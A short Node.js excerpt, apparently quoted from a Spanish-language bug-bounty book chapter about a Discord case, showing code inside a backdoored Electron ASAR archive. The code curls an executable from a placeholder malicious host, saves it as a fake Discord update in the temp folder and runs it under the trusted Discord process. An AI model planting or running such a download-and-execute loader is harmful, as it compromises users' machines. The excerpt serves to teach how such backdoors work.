// Extraído de: LibroBugBounty/cap-26-caso-discord.md
// Dentro del ASAR backdoored:
const { execSync } = require('child_process');
// Descargar payload (ofuscado como actualizacion de Discord)
execSync('curl -s https://cdn.malicious.example/update.exe -o %TEMP%/dsc_update.exe');
// Ejecutar como hijo de Discord.exe (proceso de confianza)
execSync('%TEMP%/dsc_update.exe');
